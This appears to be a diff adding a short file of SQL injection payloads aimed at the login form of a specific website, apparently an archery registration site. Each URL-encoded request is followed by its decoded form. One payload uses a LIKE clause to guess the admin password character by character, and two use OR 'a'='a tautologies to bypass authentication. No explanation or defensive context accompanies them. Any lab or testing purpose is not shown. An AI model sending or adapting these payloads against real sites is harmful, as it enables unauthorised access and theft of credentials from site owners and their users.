@@ -1,0 +1,5 @@
+    http://www.inscription_tir_arc.com/index.php?username=admin%22+AND+password+LIKE+%27a%25%27%23&password=test => http://www.inscription_tir_arc.com/index.php?username=admin" AND password LIKE 'a%'#&password=test
+
+http://www.inscription_tir_arc.com/index.php?username=+%22OR+%27a%27%3D%27a&password=test => http://www.inscription_tir_arc.com/index.php?username= "OR 'a'='a&password=test
+
+http://www.inscription_tir_arc.com/index.php?username=+%27OR+%27a%27%3D%27a&password=test => http://www.inscription_tir_arc.com/index.php?username= 'OR 'a'='a&password=test
